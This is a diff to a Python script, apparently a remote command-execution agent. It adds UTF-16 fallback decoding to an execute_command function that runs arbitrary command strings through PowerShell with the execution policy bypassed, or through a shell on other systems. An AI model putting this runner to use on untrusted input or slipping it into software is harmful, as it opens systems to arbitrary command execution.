@@ -101,6 +101,15 @@ def fetch_file(filename, dest_path):
     except Exception as e:
         return f"[!] Fetch error: {e}"
     
+def safe_decode(data: bytes) -> str:
+    """
+    Try UTF-8 first; fall back to UTF-16LE (PowerShell default).
+    """
+    try:
+        return data.decode("utf-8")
+    except UnicodeDecodeError:
+        return data.decode("utf-16-le", errors="ignore")
+
 def execute_command(command):
     try:
         if platform.system().lower().startswith("win"):
@@ -109,19 +118,16 @@ def execute_command(command):
                 "-NoProfile",
                 "-ExecutionPolicy", "Bypass",
                 "-Command",
-                (
-                    "[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; "
-                    f"{command} | Out-String | ForEach-Object {{ $_.ToString().TrimEnd() }}"
-                )
+                f"{command} | Out-String"
             ]
-            # Explicitly capture as UTF-8
             result = subprocess.check_output(ps_command, stderr=subprocess.STDOUT)
-            return result.decode("utf-8", errors="ignore")
+            decoded = safe_decode(result)
+            return decoded.strip()
         else:
             result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return result.decode("utf-8", errors="ignore")
+            return result.decode("utf-8", errors="ignore").strip()
     except subprocess.CalledProcessError as e:
-        return e.output.decode("utf-8", errors="ignore")
+        return safe_decode(e.output).strip()
     
 if __name__ == "__main__":
     try:
